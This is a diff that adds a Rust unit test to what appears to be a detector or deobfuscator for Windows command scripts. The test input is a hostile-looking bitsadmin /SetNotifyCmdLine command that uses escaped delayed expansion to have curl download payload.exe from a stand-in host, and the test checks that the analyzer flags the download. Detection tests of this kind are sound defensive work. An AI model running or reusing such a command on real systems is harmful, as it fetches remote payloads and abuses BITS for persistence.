@@ -26894,6 +26894,31 @@ mod bitsadmin_tests {
             report.traits
         );
     }
+
+    #[test]
+    fn bitsadmin_setnotifycmdline_preserves_escaped_delayed_child() {
+        let report = analyze(
+            br#"setlocal EnableDelayedExpansion
+bitsadmin /SetNotifyCmdLine job1 "%COMSPEC%" "/V:ON /c set U=https://bits-notify-escaped.example/payload.exe&&curl -o payload.exe ^!U^!""#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download {
+                        src,
+                        dst: Some(dst),
+                        ..
+                    } if src == "https://bits-notify-escaped.example/payload.exe"
+                        && dst == "payload.exe"
+                )
+            }),
+            "escaped BITS notify delayed child command was not recursively analyzed: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
 }
 
 #[cfg(test)]
